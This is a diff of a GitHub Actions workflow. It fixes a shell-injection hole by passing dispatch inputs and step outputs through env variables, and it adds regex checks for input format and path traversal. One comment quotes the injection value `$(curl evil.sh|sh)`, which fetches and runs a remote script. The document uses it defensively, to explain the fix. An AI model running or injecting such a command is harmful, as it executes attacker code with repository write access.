@@ -58,18 +58,37 @@ jobs:
 
       - name: Run journal formatter
         id: journal
+        # PR #896 BB iter-2 FIND-001 closure: workflow_dispatch inputs are
+        # passed through `env:` (which the shell reads via "$VAR" — quoted,
+        # not interpolated) instead of `${{ github.event.inputs.* }}`
+        # interpolation directly into the `run:` block. The original shape
+        # let a dispatcher value like `$(curl evil.sh|sh)` execute under
+        # the job's `contents:write + pull-requests:write` scope.
+        # Also validate the inputs against strict regexes before use.
         env:
           PYTHONPATH: ${{ github.workspace }}/.claude/adapters
+          INPUT_WINDOW: ${{ github.event.inputs.window }}
+          INPUT_RUN_TIME: ${{ github.event.inputs.run_time }}
         run: |
           set -euo pipefail
           mkdir -p grimoires/loa/substrate-health
 
-          # Pick window + run-time from inputs (workflow_dispatch) or defaults
-          window="${{ github.event.inputs.window }}"
+          # Strict input validation against the documented format
+          # (window: 24h/7d/30d/Nm  ; run_time: ISO 8601 UTC).
+          window="${INPUT_WINDOW:-24h}"
           if [[ -z "$window" ]]; then window="24h"; fi
+          if ! [[ "$window" =~ ^[0-9]+[hdm]$ ]]; then
+              echo "[journal] INVALID window input — refusing: $(printf %q "$window")" >&2
+              exit 2
+          fi
+
           rtime_arg=()
-          if [[ -n "${{ github.event.inputs.run_time }}" ]]; then
-              rtime_arg=(--run-time "${{ github.event.inputs.run_time }}")
+          if [[ -n "${INPUT_RUN_TIME:-}" ]]; then
+              if ! [[ "$INPUT_RUN_TIME" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}(\.[0-9]+)?(Z|[+-][0-9]{2}:[0-9]{2})$ ]]; then
+                  echo "[journal] INVALID run_time input — refusing: $(printf %q "$INPUT_RUN_TIME")" >&2
+                  exit 2
+              fi
+              rtime_arg=(--run-time "$INPUT_RUN_TIME")
           fi
 
           # The formatter is idempotent — re-running on the same UTC day
@@ -96,8 +115,12 @@ jobs:
 
       - name: Open auto-journal PR
         if: steps.journal.outputs.action != 'skipped'
+        # PR #896 BB iter-2 FIND-001 closure: pass step output through
+        # `env:` (so shell sees "$JOURNAL_PATH" — quoted, not interpolated).
+        # Validate the path before any shell use.
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          JOURNAL_PATH: ${{ steps.journal.outputs.path }}
         run: |
           set -euo pipefail
 
@@ -112,7 +135,16 @@ jobs:
           git fetch origin main
           git checkout -B "$branch" origin/main
 
-          path="${{ steps.journal.outputs.path }}"
+          # Validate JOURNAL_PATH shape — repo-relative, no traversal,
+          # under the expected directory. The formatter only writes here;
+          # anything else is a sign of upstream tampering.
+          if [[ -z "${JOURNAL_PATH:-}" ]] || \
+             [[ "$JOURNAL_PATH" == *".."* ]] || \
+             ! [[ "$JOURNAL_PATH" =~ ^grimoires/loa/substrate-health/[0-9]{4}-[0-9]{2}\.md$ ]]; then
+              echo "[journal-pr] REFUSING — JOURNAL_PATH outside expected shape: $(printf %q "${JOURNAL_PATH:-}")" >&2
+              exit 2
+          fi
+          path="$JOURNAL_PATH"
           # Re-run the formatter on the freshly-checked-out base so the diff is
           # against main (idempotent — same input, same output).
           PYTHONPATH=.claude/adapters python3 -m loa_cheval.journal \
